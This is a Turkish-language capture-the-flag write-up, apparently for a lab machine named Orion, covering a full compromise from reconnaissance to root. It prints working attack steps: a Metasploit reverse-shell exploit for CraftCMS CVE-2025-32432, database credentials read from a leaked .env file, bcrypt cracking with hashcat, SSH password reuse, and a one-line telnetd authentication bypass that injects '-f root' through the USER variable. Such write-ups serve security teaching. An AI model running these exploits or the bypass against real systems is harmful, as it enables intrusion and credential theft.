Orion

CraftCMS 5.6.16 üzerinde önceden kimlik doğrulama gerektirmeyen bir nesne enjeksiyonu zinciriyle başlayan, kimlik bilgisi tekrar kullanımı ve savunmasız bir telnetd ile root'a uzanan bir sızma testi süreci.

ZorlukVery Easy

01 — Keşif

Port taraması ve web enumerasyonu

Standart bir Nmap taramasıyla başlandı, sadece iki servis açık bulundu: SSH ve HTTP. Web sunucusu orion.htb host adına yönlendirme yaptığı için host dosyasına ekleme yapıldı.

nmap -sV -sC 10.129.51.107
$ nmap -sV -sC 10.129.51.107
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/

Ana sayfa yanıt başlıklarında CMS parmak izi doğrudan sızdırılmış:

curl -I http://orion.htb
$ curl -I http://orion.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
X-Powered-By: Craft CMS

Dizin taramasında (raft-small-directories.txt) idari panel ve statik dosya dizini bulundu:

gobuster dir
$ gobuster dir -u http://orion.htb -w raft-small-directories.txt -t 100
assets     (Status: 301) --> /assets/
admin      (Status: 302) --> /admin/login
logout     (Status: 302)
Not — Yanlış pozitif Aynı taramada, Host: başlığı fuzzing ile alt alan adı denendiğinde nginx tanımadığı her host için aynı 302 / 154 byte cevabını döndürdü — gerçek bir alt alan adı değil, wildcard davranışı. Boyuta göre filtrelemeden (-fs) önce bu ayrımı yapmak zaman kaybını önledi.

/admin/login sayfasının kaynağında geliştirici tarafından gizlenmemiş bir sürüm bilgisi bulundu: Craft CMS 5.6.16. Bu sürüm, CVE-2025-32432'ye karşı savunmasız — kimlik doğrulama gerektirmeyen bir RCE zinciri.

02 — Foothold

CVE-2025-32432 ile uzaktan kod çalıştırma

Zafiyet, actions/assets/generate-transform endpoint'inin JSON gövdesini Yii framework'ün nesne yapılandırma sistemi üzerinden işlemesinden kaynaklanıyor; saldırgan tarafından kontrol edilen bir class anahtarı keyfi sınıf örneklemesine ve dolayısıyla kod çalıştırmaya izin veriyor. Metasploit'in hazır modülü bu zinciri (CSRF token alma → PHP oturum dosyasına web shell enjeksiyonu → reverse shell tetikleme) otomatikleştiriyor.

msfconsole
msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
msf > set rhosts orion.htb
msf > set rport 80
msf > set lhost 10.10.17.217
msf > exploit
[*] Sending stage (42137 bytes) to 10.129.51.107
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: www-data

TTY yükseltmesi yapılıp dosya sistemi enumere edildi. Craft kurulum dizininde, .gitignore'a rağmen prodüksiyon .env dosyası dünya-okunabilir izinlerle duruyordu:

.env
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!

03 — Kimlik Bilgisi Yeniden Kullanımı

MySQL → bcrypt kırma → SSH

Sızdırılan veritabanı şifresiyle MySQL'e bağlanılıp Craft'ın users tablosu okundu. Tek admin hesabının (adam@orion.htb) bcrypt hash'i elde edildi.

mysql -u root -p orion
MariaDB [orion]> select username, email, password from users;
admin | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8N...

Hash yerel makinede (Kali) hashcat ile rockyou.txt'a karşı çalıştırıldı — bcrypt maliyeti nedeniyle CPU'da yaklaşık 21 H/s hızla ilerledi, ancak parola sözlüğün başında yer aldığı için 34 saniyede kırıldı:

hashcat -m 3200
$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
Speed.#01........:       21 H/s
$2y$13$e9zuohgFZzGtbQalcn9Mz...:darkangel
Status...........: Cracked

Kırılan parola, CraftCMS admin hesabıyla sınırlı kalmayıp sistem kullanıcısı adam için de geçerliydi — klasik parola tekrar kullanımı:

ssh adam@orion.htb
$ ssh adam@orion.htb
adam@orion.htb's password: darkangel
adam@orion:~$ cat user.txt
✓ user.txt ele geçirildi

04 — Yetki Yükseltme

CVE-2026-24061 — telnetd kimlik doğrulama atlatması

Dışa açık olmayan yerel servisler kontrol edildiğinde 127.0.0.1:23 üzerinde bir telnetd bulundu:

netstat -tulnp
$ netstat -tulnp
tcp    0  0  127.0.0.1:23    0.0.0.0:*   LISTEN
tcp    0  0  127.0.0.1:3306  0.0.0.0:*   LISTEN

GNU inetutils telnetd'sinde, USER ortam değişkeninin doğrulanmadan doğrudan login komutuna argüman olarak geçirilmesinden kaynaklanan bir zafiyet (CVE-2026-24061) mevcut. -f bayrağı login'e parola sormadan belirtilen kullanıcıyla oturum açmasını söylüyor; USER değişkenine bu bayrağı enjekte ederek doğrudan root olarak giriş yapılabiliyor.

telnetd auth bypass
adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
Connected to 127.0.0.1.
Linux orion 5.15.0-171-generic
root@orion:~# cat root.txt
✓ root.txt ele geçirildi — makine tamamlandı

Özet

Öğrenilen teknikler

  • CraftCMS/Yii framework'lerinde JSON tabanlı nesne enjeksiyonu (CVE-2025-32432) ve CSRF token'ı meşru bir GET isteğinden alıp geçerli bir POST isteğinde yeniden kullanma.
  • .env dosyalarının yanlış izinlerle sunucuda kalmasının veritabanı kimlik bilgilerini nasıl ifşa edebileceği.
  • bcrypt hash'lerinin CPU üzerinde hashcat (mod 3200) ile kırılması ve parola tekrar kullanımının web katmanından işletim sistemi katmanına nasıl sıçradığı.
  • Eski/nadir servislerin (telnetd) sadece localhost'a bağlı olsa dahi saldırı yüzeyi oluşturabileceği — CVE-2026-24061 ortam değişkeni enjeksiyonu.
